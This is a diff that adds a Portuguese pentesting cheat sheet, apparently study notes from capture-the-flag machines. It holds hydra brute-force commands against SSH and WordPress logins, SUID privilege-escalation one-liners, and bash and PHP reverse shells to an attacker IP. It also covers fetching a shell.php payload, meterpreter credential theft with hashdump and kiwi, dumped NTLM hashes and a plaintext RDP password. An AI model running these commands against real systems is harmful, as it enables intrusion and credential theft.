@@ -1,0 +1,91 @@
+#caso o ftp nao esteja aberta, tentar o comando hydra para ficar testando as senhas para o usuario 
+ex: hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://`cat ip`
+
+#sudo -l -> identifica se tem algum sudo que nao precisa de senha 
+
+#find / -name user.txt 2>/dev/null
+
+#Full TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo; fg; ls; export SHELL=/bin/bash; stty rows 38 columns 116; reset;
+export TERM=screen
+
+#Procurar por arquivos SUID - arquivos que sao permissoes de root porem usuarios normais podem executar
+find / -perm -4000 2> /dev/null
+
+#python -c 'import os; os.execl("/bin/sh", "sh", "-p")' -> escalar permissao root
+
+#scanning - processo de verificar as portas 
+
+#sudo nmap -sS -p PORTAXX testphp.vulnweb.com -Pn
+
+#hydra -L fsocity.dic -p 123(senha que sera testada) `cat ip` http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"-> boot force, ira testar os ususarios 
+
+#hydra -l elliot -P fsocity.dic `cat ip` http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -> boot force para encontrar a senha 
+
+#gobuster dir -u `cat ip` -w /usr/share/dirb/wordlists/common.txt -t 50 -x php -q -> o parametro "-x" serve para definir um padrao para ser encontrado, no exemplo no caso foi para encontrar o php e o common foi usado porque e uma lista menor do que a do big 
+
+#tee -> comando para ler arquivos
+
+#less -> comando para ler arquivos
+
+#nc -vnlp -> serve para abrir uma porta
+
+1.python -m http.server -> comando para abrir um servidor web no diretorio atual 
+2.sudo wget http://10.8.87.12:8000/shell.php -> apos abrir server web, esse comando pega o arquivo no IP da maquina e a porta que esta a pasta no servidor web
+3. depois e so colocar a maquina para ouvir nc -vnlp e a porta que esta no shell.php
+4.apos colocar o shell.php na maquina que esta a pagina web, e so executar o ip com o diretorio do shell.php e depois a maquina que esta ouvindo ja estara dentro da maquina que tem a pagina web 
+
+
+#sudo find / "nome do arquivo ou parametro" 2>/dev/null -> comnado para procurar alguma palavra 
+
+#para decodificar um codigo base64 no linux -> colocar o codigo | base64 
+
+#bash -i >& /dev/tcp/10.8.87.12/5555 0>&1
+  
+#wget http://10.8.87.12:8000/shell.php
+ 
+#exec("/bin/bash -c 'bash -i >/dev/tcp/10.8.87.12/1234 0>&1'");
+ 
+#find / -perm -4000 -type f 2>/dev/null
+
+#sudo mousepad /etc/resolve.conf
+nameserver 8.8.8.8
+
+#sudo nmap -sV --top-ports 100 `cat ip` -Pn 
+
+#sudo nmap -sV -p 8000 `cat ip` -Pn -> comando para procurar o que e a porta 8000
+
+#sudo nmap -sV -p 135,139 `cat ip` -Pn -> comando para procurar o que e a porta 135 e 139
+
+#sudo nmap -sC -p 139 `cat ip` -Pn -> comando para executar alguns scripts na porta 139
+
+#comando ps -> processos, como se fosse o gerenciado de tarefas   
+
+#comando getprivs -> verifica os privilegios
+
+#run post/multi/recon/local_exploit_suggester
+
+#migrate -N spoolsv.exe -> escalar permissao atraves do spoolsv.exe
+
+#hashdump -> pegar senha de admin
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+#load kiwi -> comando para roubar credenciais 
+	nao funcionou porque nao estamos como system ainda, entao pegar um processo que esta rodando como system e executar migrate -N svchost.exe e executar load kiwi novamente
+	
+#creds_all -> pegar todas credenciasi
+
+#rdesktop `cat ip` -u sg -p UmbracoIsTheBest! -> comando para acessar remotamente a maquina
+
+
+
+
+
+
+
+
+
+
